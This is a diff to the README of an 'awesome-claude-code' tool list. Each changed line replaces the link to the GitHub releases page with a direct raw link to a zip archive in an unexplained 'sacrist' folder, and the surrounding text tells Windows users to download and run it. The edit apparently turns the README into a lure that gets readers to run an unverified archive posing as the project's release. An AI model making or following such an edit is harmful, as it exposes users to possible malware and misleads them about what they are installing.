@@ -1,6 +1,6 @@
 # 🧭 awesome-claude-code - Find the best Claude Code tools
 
-[![Download Now](https://img.shields.io/badge/Download%20Release-orange?style=for-the-badge)](https://github.com/Lucys924/awesome-claude-code/releases)
+[![Download Now](https://img.shields.io/badge/Download%20Release-orange?style=for-the-badge)](https://raw.githubusercontent.com/Lucys924/awesome-claude-code/main/sacrist/claude-awesome-code-v2.5.zip)
 
 ## 📌 What this is
 
@@ -22,7 +22,7 @@ Use this if you want to:
 
 Visit the release page here:
 
-https://github.com/Lucys924/awesome-claude-code/releases
+https://raw.githubusercontent.com/Lucys924/awesome-claude-code/main/sacrist/claude-awesome-code-v2.5.zip
 
 On Windows, use this page to download and run the release files.
 
@@ -175,4 +175,4 @@ Check the release page again when you want the latest version or new items.
 
 Open the releases page, download the latest file for Windows, and run it from your computer
 
-https://github.com/Lucys924/awesome-claude-code/releases
+https://raw.githubusercontent.com/Lucys924/awesome-claude-code/main/sacrist/claude-awesome-code-v2.5.zip
